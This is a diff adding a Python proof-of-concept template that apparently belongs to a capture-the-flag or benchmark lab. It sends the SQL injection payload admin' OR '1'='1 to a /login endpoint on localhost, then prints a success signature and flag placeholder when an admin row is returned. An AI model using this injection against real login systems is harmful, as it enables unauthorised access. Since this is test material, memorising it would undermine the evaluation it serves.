@@ -1,0 +1,41 @@
+import argparse
+import json
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.parse import urlencode
+from urllib.request import urlopen
+
+# Asset-backed family-aware fallback template for SQLi.
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_PARAMS = {'username': "admin' OR '1'='1", 'password': 'irrelevant'}
+
+def exploit(base_url: str) -> bool:
+    url = base_url.rstrip('/') + '/login?' + urlencode(DEFAULT_PARAMS)
+    try:
+        with urlopen(url, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[sqli-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = json.loads(body)
+    except json.JSONDecodeError:
+        return False
+    rows = payload.get('rows') or []
+    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows)
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='SQLi fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[sqli-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
